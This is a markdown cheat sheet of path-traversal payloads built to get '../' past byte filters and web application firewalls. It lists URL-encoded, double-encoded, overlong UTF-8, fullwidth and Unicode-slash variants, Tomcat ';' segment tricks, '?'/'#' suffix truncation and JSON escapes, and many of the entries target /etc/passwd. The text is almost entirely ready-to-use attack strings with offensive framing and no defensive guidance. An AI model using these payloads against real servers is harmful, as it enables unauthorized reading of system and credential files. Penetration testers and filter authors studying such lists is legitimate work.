# Encoding Tricks — getting traversal past byte-filters

## The encoding arsenal — each layer of decode is a bypass

```
%2e%2e%2f                     — ../          URL-encoded
%252e%252e%252f               — ../          double-encoded
%2e%2e%5c                     — ..\
..%2f                         — ../
%2e%2e/                       — ../
%252e%252e%255c               — ..\
..%252f                       — ../
%2e%2e%252f                   — ../
```

## The UTF-8 overlong — `..%c0%af`

```
..%c0%af      — ../  — %c0%af is the overlong encoding of /
..%e0%80%af   — ../  — the 3-byte overlong
..%f0%80%80%af — ../ — the 4-byte overlong
..%c0%ae      — ..   — overlong .
```

Overlong UTF-8 encodes ASCII in 2-4 bytes — a decoder that accepts
them decodes to ASCII — a byte-filter on ASCII misses the overlong
bytes.

## The UTF-8 fullwidth — `..%ef%bc%8f`

```
..%ef%bc%8f   — ／  — FULLWIDTH SLASH U+FF0F
..%ef%bc%bc   — ＼  — FULLWIDTH BACKSLASH U+FF3C
..%ef%bc%8e   — ．  — FULLWIDTH DOT U+FF0E
```

Fullwidth forms — `＼`/`／`/`．` — the NFKC-normalizing decoder maps
them to `/`/`\`/`.`.

## The Unicode-divide — `∕`/`∖`/`╱`/`⧹`

```
%u2215        — ∕  — DIVISION SLASH
%u2216        — ∖  — SET MINUS (backslash)
%u2571        — ╱  — BOX DRAWINGS DIAGONAL
%u2572        — ╲
%u29F8        — ⧸  — BIG SOLIDUS
%u29F9        — ⧹  — BIG REVERSE SOLIDUS
%u2044        — ⁄  — FRACTION SLASH
%uFF0F        — ／
%uFF3C        — ＼
%uFF0E        — ．
```

The Unicode-separator family — a normalize-only-ASCII filter misses them.

## The case-fold — `%2E`/`%2e`/`%2F`/`%2f`

```
%2E%2E%2F     — ../   — uppercase hex
%2e%2e%2f     — ../   — lowercase
```

## The mixed-case path — `/ETC`/`/etc`

```
/ETC/PASSWD   — filesystems are case-insensitive on Windows/macOS
/EtC/PaSsWd
```

## The UTF-16/UTF-32 — `ff fe` BOM

```
ff fe .. .. / e t c / p a s s w d    — UTF-16LE
00 00 fe ff .. .. / ...               — UTF-32BE
```

## The `data:`/`quoted-printable`/`uuencode` — the layer-wraps

The whole path inside `data:`/`quoted-printable`/`uuencode` — a decode
step server-side rebuilds it — a niche double-layer.

## The hex/octal/decimal entities — `\x2e`/`&#46;`

```
%2e%2e%2f     — ../
&#46;&#46;&#47; — ../ in an HTML-entity context
\x2e\x2e\x2f  — ../ if the app decodes \xNN
```

## The "the app decodes once, you need twice" — the double-decode

```
%252e%252e%252f   — decode → %2e%2e%2f — decode → ../
```

A double-decoding pipeline — the app decodes twice — your double-
encoded payload reaches the file.

## The "the WAF decodes, the app doesn't" — the split

WAF decodes `..%2f` → sees `../` → blocks — a `..%252f` gets past the
WAF's decode → the app decodes again → `../` reaches the file — the
double-decode-desync between layers.

## The "the path is a `?`-split" — the URL-parse trick

```
?file=/etc/passwd%3f.png          — %3f = ? — the .png is in the query
?file=/etc/passwd%23.png          — %23 = # — the .png is in the fragment
```

A `.png`-suffix check — put the real path before `%3f`/`%23` — the
`?`/`#` truncates the string — the suffix check sees `.png`, the file
part sees `/etc/passwd`.

## The "the path is in a segment" — the semicolon/matrix-param

```
/file/..;/etc/passwd              — ; splits path-segment — Tomcat-style
/file/;param=../../etc/passwd
/file/..%3b/etc/passwd
```

The matrix-param/`;`-split — Java/Tomcat treats `;` as a param separator
— `..;` is a traversal.

## The "the base64-path" — the b64-param

```
?file=<base64-of-path>
```

If the param is base64-decoded server-side — encode `../../etc/passwd`
— a `path-is-b64` convention — the encoding IS the path format.

## The "the path is in a JSON field" — the unicode-escape

```json
{"file": "..\/..\/etc\/passwd"}
{"file": "..%2f..%2fetc%2fpasswd"}
{"file": "..\\u002f..\\u002fetc"}
{"file": "..\\x2f..\\x2fetc"}
{"file": "..\\/../etc/passwd"}
```

`\/` in JSON decodes to `/` — `\\u002f`/`\\x2f`/`\\/` — the JSON-escape
family.
